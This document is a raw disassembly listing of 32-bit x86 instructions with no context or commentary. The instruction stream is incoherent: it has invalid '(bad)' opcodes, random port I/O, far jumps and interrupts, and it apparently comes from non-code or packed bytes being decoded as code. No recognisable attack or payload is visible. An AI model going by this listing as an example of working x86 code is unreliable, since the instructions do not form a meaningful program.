  414274:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414275:	out    dx,eax
  414276:	(bad)  
  414278:	cld    
  414279:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41427a:	sahf   
  41427b:	mov    dl,0xd8
  41427d:	inc    eax
  41427e:	test   BYTE PTR [esi],dh
  414280:	add    eax,DWORD PTR [edi+0x39a1729]
  414286:	cmp    eax,0xb6d20550
  41428b:	pop    esi
  41428c:	popf   
  41428d:	out    dx,al
  41428e:	jmp    0xafbe:0x10224b07
  414295:	jp     0x4142d1
  414297:	xchg   edx,edx
  414299:	cld    
  41429a:	mov    ebp,0x18cef637
  41429f:	in     eax,0xf2
  4142a1:	das    
  4142a2:	cmp    ah,ch
  4142a4:	std    
  4142a5:	and    DWORD PTR ds:0x80b546e4,esi
  4142ab:	dec    eax
  4142ac:	fisubr DWORD PTR [eax]
  4142ae:	jo     0x4142e3
  4142b0:	jmp    0x4142e9
  4142b2:	dec    eax
  4142b3:	loopne 0x41428b
  4142b5:	cmp    ecx,DWORD PTR [esi]
  4142b7:	jae    0x4142e0
  4142b9:	scas   eax,DWORD PTR es:[edi]
  4142ba:	xor    al,0x9f
  4142bc:	fnsave [ebx+0x328cf3cb]
  4142c2:	lahf   
  4142c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142c4:	stos   BYTE PTR es:[edi],al
  4142c5:	inc    ebx
  4142c6:	mov    DWORD PTR [ebp+0x36],esp
  4142c9:	dec    ebp
  4142ca:	and    edi,DWORD PTR [ebp+0x3a41208d]
  4142d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142d1:	mov    ah,0x9a
  4142d3:	adc    bh,dl
  4142d5:	and    DWORD PTR [ebx+0x4f0083ce],ecx
  4142db:	push   ds
  4142dc:	pusha  
  4142dd:	xor    ebp,DWORD PTR [esi-0x64]
  4142e0:	aad    0xd2
  4142e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142e3:	xchg   DWORD PTR [esi+0x7b],esi
  4142e6:	cs jo  0x4142cd
  4142e9:	pop    eax
  4142ea:	pop    ecx
  4142eb:	pop    ds
  4142ec:	addr16 mov fs,ebp
  4142ef:	int3   
  4142f0:	mov    BYTE PTR [edi],ch
  4142f2:	in     al,dx
  4142f3:	pop    ebx
  4142f4:	dec    ebx
  4142f5:	push   esi
  4142f6:	shr    BYTE PTR [ebx],1
  4142f8:	mov    ?,WORD PTR [ecx]
  4142fa:	or     al,0x2c
  4142fc:	push   eax
  4142fd:	push   DWORD PTR [eax]
  4142ff:	imul   ecx,DWORD PTR [edi],0x2a
  414302:	test   al,0xa0
  414304:	enter  0x4f2b,0x16
  414308:	jl     0x414370
  41430a:	pop    ecx
  41430b:	xor    edi,edi
  41430d:	test   eax,0x40f87c9c
  414312:	jo     0x414327
  414314:	lea    edi,[ebx+0x6]
  414317:	scas   eax,DWORD PTR es:[edi]
  414318:	add    BYTE PTR [esi],bh
  41431a:	push   0x2e6b299b
  41431f:	retf   0x8038
  414322:	sub    al,0x94
  414324:	imul   esi,DWORD PTR [edx+0xa],0xef9cc805
  41432b:	push   0x55e8f91
  414330:	bound  ebx,QWORD PTR [edx+0x649f95ed]
  414336:	add    al,0xf9
  414338:	loopne 0x414380
  41433a:	bound  ebp,QWORD PTR [edi-0x1260bdc3]
  414340:	inc    ebx
  414341:	cwde   
  414342:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414343:	rcl    DWORD PTR [esp+ebp*8],0x67
  414347:	jmp    0x4142e9
  414349:	add    BYTE PTR [ecx+0x66],bl
  41434c:	fsubr  DWORD PTR [edi+0x8]
  41434f:	adc    BYTE PTR [ebp-0x14],al
  414352:	data16 xor cl,dl
  414355:	cmp    DWORD PTR [ecx-0x4e25de0f],edx
  41435b:	jge    0x4143d3
  41435d:	cmp    eax,0x99e36c29
  414362:	xchg   ebx,eax
  414363:	imul   eax,edi,0xfcd55de
  414369:	push   ecx
  41436a:	int    0x84
  41436c:	push   edx
  41436d:	out    0xf9,al
  41436f:	inc    esi
  414370:	call   0x31a7db12
  414375:	add    al,0x1c
  414377:	fcmovnu st,st(6)
  414379:	int    0xd7
  41437b:	shr    BYTE PTR [ecx-0x5c],cl
  41437e:	lds    ebp,FWORD PTR [edx-0x6395f5bb]
  414384:	cdq    
  414385:	lods   eax,DWORD PTR ds:[esi]
  414386:	cs out 0x99,eax
  414389:	ret    0x57f5
  41438c:	adc    esi,DWORD PTR [ebx]
  41438e:	mov    WORD PTR [esi-0xef15329],fs
  414394:	fistp  DWORD PTR [ecx+0x2c]
  414397:	inc    ebp
  414398:	mov    edx,0x2a32a4ce
  41439d:	out    dx,eax
  41439e:	pop    esp
  41439f:	data16 mov dl,0x74
  4143a2:	or     eax,0xb2e1bf15
  4143a7:	(bad)  
  4143a8:	in     eax,dx
  4143a9:	inc    edi
  4143aa:	jmp    0xf324:0x6c93562b
  4143b1:	sbb    al,0x1a
  4143b3:	cmp    ah,BYTE PTR [edx]
  4143b5:	and    al,0x84
  4143b7:	int    0xc5
  4143b9:	or     eax,0x768bfa03
  4143be:	cli    
  4143bf:	call   0xa3cd46c9
  4143c4:	call   0x4fed4e60
  4143c9:	jmp    0x41440c
  4143cb:	inc    edx
  4143cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143cd:	js     0x4143e4
  4143cf:	aad    0xf0
  4143d1:	aas    
  4143d2:	push   ebx
  4143d3:	push   esi
  4143d4:	and    eax,0x953d6db
  4143d9:	push   eax
  4143da:	les    ecx,FWORD PTR [ebx+0x2661509f]
  4143e0:	dec    ecx
  4143e1:	or     BYTE PTR [edx+0x30aecdde],dl
  4143e7:	test   eax,0xa7c0ede4
  4143ec:	or     ebp,esp
  4143ee:	ret    0x9581
  4143f1:	push   es
  4143f2:	add    cl,bh
  4143f4:	loope  0x41438c
  4143f6:	into   
  4143f7:	sbb    eax,0xbf32f6ed
  4143fc:	sbb    BYTE PTR cs:[eax+0x18],al
  414400:	bnd jp 0x414431
  414403:	jmp    0x4143ca
  414405:	adc    esp,edi
  414407:	mov    edx,0x62abb8de
  41440c:	aaa    
  41440d:	mov    esi,0xc2aac396
  414412:	pushf  
  414413:	mov    esp,0x16aedcad
  414418:	mov    dl,BYTE PTR [ecx+0x6acad1d9]
  41441e:	pop    eax
  41441f:	jg     0x4143be
  414421:	ins    BYTE PTR es:[edi],dx
  414422:	pop    ds
  414423:	push   ds
  414424:	fmulp  st(1),st
  414426:	add    eax,0xf7e6fdc5
  41442b:	mov    bl,0x46
  41442d:	or     dl,BYTE PTR [ebx+ebx*4-0x374e7402]
  414434:	push   ecx
  414435:	loop   0x414479
  414437:	xor    esp,DWORD PTR [ecx+0x1]
  41443a:	cmc    
  41443b:	jp     0x41440d
  41443d:	cmp    al,BYTE PTR [edi]
  41443f:	sub    al,BYTE PTR [edi-0x1755fb62]
  414445:	or     eax,0x43138663
  41444a:	mov    edx,0x6e4784d1
  41444f:	jmp    0x41444b
  414451:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414452:	cmp    ch,BYTE PTR [edi]
  414454:	in     eax,dx
  414455:	cmc    
  414456:	sub    dl,BYTE PTR [edx+0x38]
  414459:	mov    ds:0xd37bede,eax
  41445e:	add    edi,DWORD PTR [ecx-0x59904b50]
  414464:	into   
  414465:	dec    ebp
  414466:	imul   esp,DWORD PTR [edx],0x56acd8ad
  41446c:	push   ds
  41446d:	stc    
  41446e:	sbb    al,0x23
  414470:	xchg   ecx,eax
  414471:	(bad)  
  414472:	fist   WORD PTR [edx-0x2bd309aa]
  414478:	leave  
  414479:	and    ah,dl
  41447b:	inc    eax
  41447c:	imul   ebx,esp,0xffffff87
  41447f:	ret    0x1640
  414482:	mov    bh,0x9
  414484:	fidiv  DWORD PTR [ecx+0x6abb2472]
  41448a:	push   ss
  41448b:	mov    ds:0x1570cc6f,eax
  414490:	push   0x56
  414492:	bound  edi,QWORD PTR [ebp-0x77]
  414495:	(bad)  
  414496:	pop    esi
  414497:	cmp    DWORD PTR [ecx],esp
  414499:	call   0x4a20d990
  41449e:	shl    DWORD PTR [edi+edx*1+0x29ad6481],1
  4144a5:	sbb    bl,BYTE PTR [ecx]
  4144a7:	jecxz  0x414464
  4144a9:	xchg   ecx,eax
  4144aa:	xor    DWORD PTR [esi],ecx
  4144ac:	cmp    dl,al
  4144ae:	gs (bad) 
  4144b0:	jmp    0x77554499
  4144b5:	std    
  4144b6:	cwde   
  4144b7:	mov    edx,0xb78a603f
  4144bc:	lock jl 0x4144bd
  4144bf:	xchg   DWORD PTR [esi],esi
  4144c1:	pop    eax
  4144c2:	rol    DWORD PTR [edi-0x7ac5c5be],0x16
  4144c9:	nop
  4144ca:	fist   WORD PTR [esp+edx*4-0x5668c5b3]
  4144d1:	ja     0x41445a
  4144d3:	jno    0x41454d
  4144d5:	mov    cl,0x46
  4144d7:	lods   eax,DWORD PTR ds:[esi]
  4144d8:	fcom   QWORD PTR [edi+edi*4]
  4144db:	outs   dx,DWORD PTR ds:[esi]
  4144dc:	sbb    al,0x5b
  4144de:	cmp    al,0xe
  4144e0:	jnp    0x414535
  4144e2:	clc    
  4144e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144e4:	pusha  
  4144e5:	pop    esp
  4144e6:	mov    ebp,0xa44545b
  4144eb:	xor    al,0x7c
  4144ed:	xor    ecx,DWORD PTR [edi]
  4144ef:	jne    0x41453a
  4144f1:	pop    edx
  4144f2:	mov    bh,0x41
  4144f4:	psrad  mm5,QWORD PTR [ecx+0x147e4dd8]
  4144fb:	into   
  4144fc:	sbb    bh,BYTE PTR [eax]
  4144fe:	push   ecx
  4144ff:	neg    DWORD PTR [ecx]
  414501:	sub    BYTE PTR [edx+ebp*2+0x14c8c40c],ah
  414508:	or     dh,BYTE PTR [eax-0x5b40b790]
  41450e:	push   ss
  41450f:	loopne 0x41454c
  414511:	mov    DWORD PTR [ebx+0x3b],edi
  414514:	dec    edx
  414515:	cmp    BYTE PTR ds:0xd0eb4412,ah
  41451b:	fwait
  41451c:	ds jae 0x414506
  41451f:	daa    
  414520:	hlt    
  414521:	xor    eax,0x3e43350b
  414526:	aaa    
  414527:	adc    DWORD PTR [esi-0x510e1593],0x20
  41452e:	jb     0x4145a2
  414530:	popa   
  414531:	das    
  414532:	fcmovu st,st(5)
  414535:	add    bl,0xfe
  414538:	enter  0x6642,0x9e
  41453c:	pop    es
  41453d:	sub    BYTE PTR [ecx-0x80],dh
  414540:	cwde   
  414541:	scas   al,BYTE PTR es:[edi]
  414542:	fstp   TBYTE PTR [eax-0x68e05463]
  414548:	pop    ss
  414549:	push   ds
  41454a:	mov    bh,0x88
  41454c:	pop    edi
  41454d:	xor    ebx,0x18
  414550:	test   al,0x8e
  414552:	push   cs
  414553:	and    eax,0x71761ce
  414558:	imul   ecx,DWORD PTR [edx],0xffffff80
  41455b:	lahf   
  41455c:	add    DWORD PTR [ecx+0x3cc6653f],0x72e49782
  414566:	lahf   
  414567:	xor    ebp,eax
  414569:	aad    0x3c
  41456b:	out    dx,eax
  41456c:	js     0x414516
  41456e:	mov    edi,DWORD PTR [ebx]
  414570:	pusha  
  414571:	jmp    0xded49d45
  414576:	push   esp
  414577:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414578:	cmp    BYTE PTR [eax-0xf],bh
  41457b:	or     ebp,DWORD PTR [eax]
  41457d:	call   0xebb1:0xedd2ef51
  414584:	fadd   DWORD PTR [eax+0x344a4232]
  41458a:	dec    ecx
  41458b:	mov    bh,0xbe
  41458d:	mov    al,ds:0xd9ea5109
  414592:	cmp    BYTE PTR [ebx+0x5f7576e1],al
  414598:	or     eax,0x31d4dac8
  41459d:	and    eax,0x7472c467
  4145a2:	(bad)  
  4145a5:	addr16 test eax,0x4bd3e418
  4145ab:	(bad)  
  4145ad:	frstor [eax+0x54]
  4145b0:	add    edx,DWORD PTR [esi]
  4145b2:	cdq    
  4145b3:	jb     0x4145e7
  4145b5:	loope  0x4145ca
  4145b7:	adc    eax,0x9004a9ff
  4145bc:	ja     0x41456b
  4145be:	je     0x4145dd
  4145c0:	adc    DWORD PTR [ebx-0x48],0xdad0b3c8
  4145c7:	leave  
  4145c8:	dec    esi
  4145c9:	lds    ebp,FWORD PTR [edx+0x7d3f29d1]
  4145cf:	inc    ebp
  4145d0:	inc    ecx
  4145d1:	inc    edi
  4145d2:	pop    ecx
  4145d3:	rol    bh,1
  4145d5:	jae    0x41459c
  4145d7:	fisub  WORD PTR [esi+0x40ead642]
  4145dd:	cld    
  4145de:	dec    esp
  4145df:	xchg   edi,eax
  4145e0:	jb     0x4145d0
  4145e2:	mov    dl,0x8b
  4145e4:	jae    0x41462c
  4145e6:	add    eax,ebx
  4145e8:	cdq    
  4145e9:	outs   dx,BYTE PTR ds:[esi]
  4145ea:	aam    0x43
  4145ec:	leave  
  4145ed:	mov    edi,0x7bbe8ab5
  4145f2:	add    edi,ecx
  4145f4:	fistp  QWORD PTR [ebx-0x4f57f5cd]
  4145fa:	push   ecx
  4145fb:	fisttp WORD PTR ds:0xb0dc5d05
  414601:	or     eax,DWORD PTR [ebx]
  414603:	jno    0x4145cf
  414605:	in     al,dx
  414606:	call   0x6e65:0x2690429a
  41460d:	jmp    0x414639
  41460f:	push   edi
  414610:	cld    
  414611:	icebp  
  414612:	and    BYTE PTR [esi-0x74],0x13
  414616:	lock mov edi,0x58ba556d
  41461c:	stos   DWORD PTR es:[edi],eax
  41461d:	pop    ebp
  41461e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41461f:	leave  
  414620:	pop    ebx
  414621:	loop   0x414680
  414623:	pop    edx
  414624:	sahf   
  414625:	or     ecx,ebx
  414627:	pop    edx
  414628:	(bad)
  41462c:	pop    esi
  41462d:	and    DWORD PTR [edi-0x43],ecx
  414630:	dec    ebp
  414631:	push   es
  414632:	retf   
  414633:	std    
  414634:	mov    BYTE PTR [ecx+edx*8],bh
  414637:	popa   
  414638:	xchg   esp,eax
  414639:	(bad)  
  41463a:	adc    eax,ebx
  41463c:	sbb    eax,0x6fcb0d52
  414641:	push   edx
  414642:	popa   
  414643:	imul   ecx,edx,0xffffffae
  414646:	dec    esi
  414647:	inc    esi
  414648:	aaa    
  414649:	mov    eax,ds:0x62f2ffea
  41464e:	mov    dh,0x1b
  414650:	repnz fild QWORD PTR [edi]
  414653:	js     0x414608
  414655:	or     esi,ecx
  414657:	pop    ebp
  414658:	sub    DWORD PTR [edx],0xffffffed
  41465b:	cmp    ah,bl
  41465d:	das    
  41465e:	out    0xb9,eax
  414660:	cmp    al,0x7b
  414662:	test   DWORD PTR [ebx-0x7412aafb],edx
  414668:	lds    ebx,FWORD PTR [edx-0x49]
  41466b:	arpl   WORD PTR [ecx+edx*2+0x19],bp
  41466f:	dec    esi
  414670:	stos   BYTE PTR es:[edi],al
  414671:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414672:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414673:	cmp    al,0xee
  414675:	inc    esp
  414676:	call   0xe88c:0x769c1dfa
  41467d:	fadd   QWORD PTR [ebp-0x11]
  414680:	inc    esi
  414681:	or     al,0x85
  414683:	sbb    ebx,DWORD PTR [ecx+eiz*4-0x4f37d4ec]
  41468a:	cmc    
  41468b:	sbb    ebx,0x475cdd37
  414691:	enter  0xd576,0x9a
  414695:	lahf   
  414696:	adc    dl,BYTE PTR [eax-0x79]
  414699:	dec    esi
  41469a:	out    dx,al
  41469b:	dec    ecx
  41469d:	and    dl,cl
  41469f:	xchg   edi,eax
  4146a0:	hlt    
  4146a1:	imul   esp,DWORD PTR [esi],0x36d5a32f
  4146a7:	leave  
  4146a8:	int    0xe7
  4146aa:	inc    edi
  4146ab:	jno    0x414638
  4146ad:	and    al,0x71
  4146af:	ss xchg al,ch
  4146b2:	addr16 aaa 
  4146b4:	int    0xfc
  4146b6:	addr16 loopne 0x414732
  4146b9:	in     eax,dx
  4146ba:	xor    ebx,DWORD PTR [ecx]
  4146bc:	popa   
  4146bd:	cdq    
  4146be:	(bad)  
  4146bf:	rcr    BYTE PTR [ebx],cl
  4146c1:	mov    al,0x63
  4146c3:	cwde   
  4146c4:	push   ebx
  4146c5:	dec    edi
  4146c6:	adc    dl,BYTE PTR [edi+0x5db3ddc2]
  4146cc:	loope  0x414668
  4146ce:	push   edx
  4146cf:	push   ecx
  4146d0:	pop    edi
  4146d1:	sub    DWORD PTR [edx],0xec8a4fe3
  4146d7:	(bad)  
  4146d8:	shl    bl,0xdc
  4146db:	mov    edx,0xa3dcf1c3
  4146e0:	loop   0x414749
  4146e2:	sahf   
  4146e3:	aaa    
  4146e4:	ret    0x18ff
  4146e7:	and    al,0x46
  4146e9:	stos   BYTE PTR es:[edi],al
  4146ea:	add    DWORD PTR [edx+0x7684dd30],ecx
  4146f0:	aaa    
  4146f1:	cmp    ecx,DWORD PTR [edx]
  4146f3:	mov    bl,0xcb
  4146f5:	retf   
  4146f6:	push   ds
  4146f7:	push   eax
  4146f8:	imul   esp,DWORD PTR [edx+0x68],0x3c
  4146fc:	rol    DWORD PTR ds:0x8c2176,1
  414702:	jmp    0x1a03:0x9f46e62d
  414709:	in     al,dx
  41470a:	jle    0x4146c5
  41470c:	xchg   BYTE PTR [ebx-0x66c5c635],al
  414712:	fsubrp st(5),st
  414714:	std    
  414715:	or     ah,BYTE PTR [esp+ebp*8-0x3be9e632]
  41471c:	jb     0x4146f6
  41471e:	xchg   esp,eax
  41471f:	push   esp
  414720:	adc    edi,esi
  414722:	dec    esi
  414723:	lea    esi,[ebx+0x3c]
  414726:	xchg   edi,eax
  414727:	cmp    eax,0x2aa05e08
  41472c:	jmp    0x792f:0x9925d3fe
  414733:	in     al,dx
  414734:	adc    BYTE PTR [edi],dh
  414736:	jns    0x414786
  414738:	(bad)  
  414739:	jmp    0xb8c58cde
  41473e:	mov    WORD PTR [edx-0x2a],gs
  414741:	pop    ebp
  414742:	sbb    cl,BYTE PTR [ebx]
  414744:	mov    ebx,0x55f85a66
  414749:	jno    0x41478d
  41474b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41474c:	js     0x4147ac
  41474e:	and    edx,DWORD PTR [esi]
  414750:	and    ecx,DWORD PTR [eax]
  414752:	or     DWORD PTR [eax-0x64],edi
  414755:	enter  0x65ff,0xc8
  414759:	(bad)  
  41475a:	retf   
  41475b:	sub    bh,BYTE PTR [ebx]
  41475d:	push   eax
  41475e:	fld    QWORD PTR [ebp+0xb1ca5a5]
  414764:	(bad)  
  414765:	and    eax,0xdf1c8702
  41476a:	mov    ?,WORD PTR [edi-0x10064d3e]
  414770:	dec    edx
  414771:	es push ds
  414773:	sub    DWORD PTR ds:0x22954873,ebp
  414779:	mov    ah,0x7b
  41477b:	das    
  41477c:	jmp    0x41477b
  41477e:	jmp    0x4147e0
  414780:	aad    0x8c
  414782:	pop    edx
  414783:	add    eax,0x77cb7645
  414788:	cmc    
  414789:	dec    edi
  41478a:	shl    edi,0x9d
  41478d:	pop    es
  41478e:	(bad)  
  41478f:	cmc    
  414790:	ins    BYTE PTR es:[edi],dx
  414791:	pusha  
  414792:	in     eax,0x6e
  414794:	cwde   
  414795:	dec    edi
  414796:	ror    DWORD PTR [ecx+0x188896b7],0x9e
  41479d:	in     al,0x5a
  41479f:	add    eax,0x8346a4e6
  4147a4:	mov    ds:0x3a375351,al
  4147a9:	adc    bh,BYTE PTR [esi+0x45]
  4147ac:	dec    ebx
  4147ad:	mov    edi,cr7
  4147b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147b1:	mov    cl,0xc4
  4147b3:	xor    bh,BYTE PTR [ebx+0x3f57a5b]
  4147b9:	mov    al,ds:0x2cc71853
  4147be:	inc    eax
  4147bf:	add    BYTE PTR [esi+0x54],ah
  4147c2:	push   edi
  4147c3:	push   es
  4147c4:	cli    
  4147c5:	add    eax,0xee5b7ec
  4147ca:	cmc    
  4147cb:	(bad)  
  4147cc:	lods   al,BYTE PTR ds:[esi]
  4147cd:	xchg   edi,eax
  4147ce:	pop    edi
  4147cf:	bound  esi,QWORD PTR [ebp+0x44]
  4147d2:	aam    0xfc
  4147d4:	and    esp,DWORD PTR [ecx+0x4d174c94]
  4147da:	je     0x414806
  4147dc:	adc    bl,bl
  4147de:	loope  0x414798
  4147e0:	(bad)  
  4147e1:	mov    dl,0xf6
  4147e3:	ror    edx,cl
  4147e5:	or     ebx,0x64
  4147e8:	mov    al,ds:0xb6bbd9ca
  4147ed:	mov    al,0x44
  4147ef:	es pop edi
  4147f1:	push   cs
  4147f2:	mov    edi,0x63b8f85b
  4147f7:	ins    DWORD PTR es:[edi],dx
  4147f8:	gs (bad) 
  4147fa:	outs   dx,DWORD PTR ds:[esi]
  4147fb:	lock mov ch,BYTE PTR [esi-0x52328848]
  414802:	sbb    al,0x5e
  414804:	mov    cl,0xe1
  414806:	sbb    eax,0xebbd6d04
  41480b:	popa   
  41480c:	adc    eax,DWORD PTR [edx-0x39c4575e]
  414812:	lock and al,0x92
  414815:	loope  0x414824
  414817:	js     0x414863
  414819:	rol    DWORD PTR [edx+ecx*2-0x3be27ad7],0x5c
  414821:	(bad)  
  414823:	jmp    0xf361:0xd995a048
  41482a:	shl    ch,cl
  41482c:	ins    DWORD PTR es:[edi],dx
  41482d:	fisub  DWORD PTR ds:[edx]
  414830:	adc    eax,0x18b632fb
  414835:	cmp    bl,al
  414837:	call   0xf4f7690c
  41483c:	(bad)  
  41483d:	or     ebp,ebx
  41483f:	jmp    0x4148b7
  414841:	(bad)  
  414842:	cmp    esi,DWORD PTR [esi+0x4012e68d]
  414848:	(bad)  
  41484a:	loop   0x414817
  41484c:	sahf   
  41484d:	(bad)  [ebx+0x1e]
  414850:	iret   
  414851:	and    DWORD PTR [eax+0x16],eax
  414854:	leave  
  414855:	xor    sp,sp
  414858:	jecxz  0x41488b
  41485a:	mov    gs,esp
  41485c:	mov    ah,0x4a
  41485e:	jl     0x4148c7
  414860:	sbb    eax,0xd6e9fa53
  414865:	cmp    ebx,edx
  414867:	xchg   edx,eax
  414868:	daa    
  414869:	mov    cl,0x33
  41486b:	cli    
  41486c:	shl    DWORD PTR [ebx+0x72],0xe6
  414870:	repz or eax,0x7a33e966
  414876:	enter  0x2d6f,0x5c
  41487a:	out    dx,eax
  41487b:	add    al,0xb6
  41487d:	xor    al,0xb8
  41487f:	(bad)  
  414880:	sbb    ecx,DWORD PTR [eax+esi*2]
  414883:	in     eax,0x29
  414885:	lods   eax,DWORD PTR ds:[esi]
  414886:	add    ebx,DWORD PTR [ecx]
  414888:	rol    DWORD PTR [esi+edx*8+0x2e],cl
  41488c:	push   esp
  41488d:	das    
  41488e:	ins    BYTE PTR es:[edi],dx
  41488f:	mov    dh,0x88
  414891:	inc    eax
  414892:	inc    ebp
  414893:	lahf   
  414894:	dec    edi
  414895:	add    DWORD PTR [edi],0x917352de
  41489b:	xor    BYTE PTR [edi-0xe4cf226],dh
  4148a1:	cmp    esp,ecx
  4148a3:	ins    BYTE PTR es:[edi],dx
  4148a4:	xor    BYTE PTR [esp+ecx*1-0x63ad9cef],0x40
  4148ac:	mov    bh,BYTE PTR [edi]
  4148ae:	lock sbb al,0xa
  4148b1:	pop    eax
  4148b2:	push   esp
  4148b3:	imul   esi,DWORD PTR [ecx-0x1d],0x4c
  4148b7:	mov    ds:0xa7cd31c6,eax
  4148bc:	repz rcl BYTE PTR [eax+edi*2],0x41
  4148c1:	call   0x87ab6f62
  4148c6:	fbld   TBYTE PTR [ecx]
  4148c8:	jne    0x4148af
  4148ca:	and    bl,al
  4148cc:	les    esp,FWORD PTR [ebx-0x73]
  4148cf:	cmp    esi,0x473a57d9
  4148d5:	js     0x414956
  4148d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148d8:	add    eax,0x3e125b8b
  4148dd:	ret    0x9e64
  4148e0:	rol    ebx,1
  4148e2:	inc    ecx
  4148e3:	pusha  
  4148e4:	mov    cl,0x6e
  4148e6:	push   ds
  4148e7:	lods   al,BYTE PTR ds:[esi]
  4148e8:	fbstp  TBYTE PTR [edi]
  4148ea:	adc    eax,0x1a16930
  4148ef:	pop    ds
  4148f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148f1:	loope  0x41487b
  4148f3:	ret    0xddbc
  4148f6:	sub    al,0x10
  4148f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148f9:	or     al,0x9d
  4148fb:	ret    
  4148fc:	fsubr  st,st(1)
  4148fe:	nop
  4148ff:	mov    bh,al
  414901:	stc    
  414902:	pop    ds
  414903:	hlt    
  414904:	push   esp
  414905:	adc    eax,0xe0d8eafd
  41490a:	outs   dx,BYTE PTR ds:[esi]
  41490b:	xchg   ebp,ebp
  41490d:	inc    edi
  41490e:	loope  0x414974
  414910:	mov    DWORD PTR [esi],esp
  414912:	mov    ebp,0xcb01e0a0
  414917:	retf   
  414918:	mov    gs,WORD PTR [edx-0x3e5132f]
  41491e:	cmp    BYTE PTR [ebp-0x4a11aed1],dh
  414924:	cmp    ebx,DWORD PTR [edx]
  414926:	aad    0xf7
  414928:	jnp    0x41498b
  41492a:	push   edi
  41492b:	repnz xlat BYTE PTR ds:[ebx]
  41492d:	xchg   edx,eax
  41492e:	retf   0x7593
  414931:	out    dx,eax
  414932:	int    0xb
  414934:	leave  
  414935:	shl    dl,cl
  414937:	and    BYTE PTR [ecx-0x2b505e40],0x29
  41493e:	inc    eax
  41493f:	jnp    0x4148d5
  414941:	sub    ch,BYTE PTR [ecx+0x7f7231df]
  414947:	int    0xf9
  414949:	sub    ebp,DWORD PTR [eax-0x47]
  41494c:	gs mov al,0xfc
  41494f:	cmp    ch,BYTE PTR [ebx-0x5d092a9a]
  414955:	cld    
  414956:	jg     0x41498a
  414958:	ret    
  414959:	ja     0x414950
  41495b:	or     al,BYTE PTR [ebx]
  41495d:	popf   
  41495e:	dec    ebp
  41495f:	jns    0x414994
  414961:	mov    ch,0x98
  414963:	dec    esp
  414964:	add    ah,dl
  414966:	and    cl,cl
  414968:	fldenv [ebx-0x45]
  41496b:	sub    eax,0xf0faad5d
  414970:	jl     0x414987
  414972:	push   ecx
  414973:	push   ss
  414974:	popf   
  414975:	mov    dl,0xc8
  414977:	push   ds
  414978:	inc    ecx
  414979:	loopne 0x4149ec
  41497b:	push   0xffffffc4
  41497d:	push   eax
  41497e:	in     al,0x56
  414980:	mov    bh,0x9f
  414982:	and    al,0x84
  414984:	pop    eax
  414985:	mov    esi,0xb1986bf5
  41498a:	dec    ebp
  41498b:	(bad)  
  41498c:	data16 aam 0x22
  41498f:	cld    
  414990:	sbb    eax,0x52958d34
  414995:	scas   eax,DWORD PTR es:[edi]
  414996:	jbe    0x4149c7
  414998:	out    0xd9,eax
  41499a:	mov    eax,0x9a689ccb
  41499f:	ins    DWORD PTR es:[edi],dx
  4149a0:	add    al,0x23
  4149a2:	push   ecx
  4149a3:	xchg   edx,ebx
  4149a5:	test   al,0x5c
  4149a7:	leave  
  4149a8:	lods   eax,DWORD PTR ds:[esi]
  4149a9:	lea    eax,[edi+0x7]
  4149ac:	call   0x4308:0xe73d2984
  4149b3:	jne    0x4149ef
  4149b5:	adc    DWORD PTR [eax-0x78],ebx
  4149b8:	xor    ebx,ebp
  4149ba:	int3   
  4149bb:	mov    gs,ebx
  4149bd:	mov    BYTE PTR [eax+esi*8+0x4bc4f57a],bl
  4149c4:	inc    esi
  4149c5:	xchg   ebx,eax
  4149c6:	push   esp
  4149c7:	sbb    al,0xd7
  4149c9:	inc    ecx
  4149ca:	pop    edx
  4149cb:	ret    0x27da
  4149ce:	ss aad 0x86
  4149d1:	pop    ebx
  4149d2:	loope  0x414957
  4149d4:	add    dl,BYTE PTR [ebx-0x3]
  4149d7:	jge    0x414a14
  4149d9:	add    BYTE PTR [ebx-0x694ce336],ch
  4149df:	jmp    0x36429c77
  4149e4:	lock sahf 
  4149e6:	shr    ebp,0x1d
  4149e9:	adc    al,0x8e
  4149eb:	neg    DWORD PTR [eax-0x34f0aaa8]
  4149f1:	dec    ecx
  4149f2:	lods   al,BYTE PTR ds:[esi]
  4149f3:	xchg   esp,eax
  4149f4:	pop    eax
  4149f5:	frstor [eax+edi*4-0x426c7e2c]
  4149fc:	fwait
  4149fd:	popa   
  4149fe:	call   ecx
  414a00:	and    al,0x2a
  414a02:	(bad)  
  414a03:	in     al,dx
  414a04:	rcr    edi,1
  414a06:	dec    edx
  414a07:	adc    DWORD PTR [ecx-0x51adf50],edi
  414a0d:	jns    0x414a6e
  414a0f:	test   eax,0x63de7272
  414a14:	jmp    0x4c25:0xe711603f
  414a1b:	adc    eax,0xdab5fcf7
  414a20:	jno    0x4149c3
  414a22:	sbb    esp,DWORD PTR [ecx]
  414a24:	imul   ebp,ebx,0x6712b8c
  414a2a:	pop    esi
  414a2b:	pusha  
  414a2c:	lods   al,BYTE PTR ds:[esi]
  414a2d:	mov    eax,ebp
  414a2f:	jg     0x414a8c
  414a31:	sbb    ah,cl
  414a33:	bound  esp,QWORD PTR [edx-0x5ccd0f67]
  414a39:	cmp    DWORD PTR [esi+0x8be2647],esp
  414a3f:	mov    al,0x3e
  414a41:	sub    edx,ebp
  414a43:	xor    eax,0x1611747b
  414a48:	in     al,0x64
  414a4a:	sbb    cl,ch
  414a4c:	and    al,BYTE PTR [esi]
  414a4e:	mov    cl,0x2c
  414a50:	jl     0x414a6b
  414a52:	shl    BYTE PTR [ecx+0xdc4a708],cl
  414a58:	xor    al,0xf1
